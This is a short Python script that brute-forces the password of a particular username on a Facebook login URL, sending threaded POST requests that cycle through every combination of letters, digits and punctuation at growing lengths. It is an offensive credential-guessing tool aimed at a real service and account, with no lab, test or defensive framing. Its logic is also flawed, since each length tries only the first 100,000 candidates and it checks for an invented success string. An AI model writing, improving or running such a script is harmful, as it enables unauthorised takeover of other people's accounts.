import itertools
import string
import requests
import concurrent.futures

url = 'https://nb-no.facebook.com/'
username = '90550266'
charset = string.ascii_lowercase + string.ascii_uppercase + string.digits + string.punctuation

def check_password(password):
    data = {'username': username, 'password': password}
    response = requests.post(url, data=data)
    print(password)
    if response.status_code == 200 and 'Login successful' in response.text:
        print('Password found:', password)
        return password


password_length = 8
print("Script started")

while True:
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        passwords = itertools.product(charset, repeat=password_length)
        futures = [executor.submit(check_password, ''.join(password)) for password in itertools.islice(passwords, 100000)]
        for future in concurrent.futures.as_completed(futures):
            if future.result():
                break

    if future.result():
        break

    password_length += 1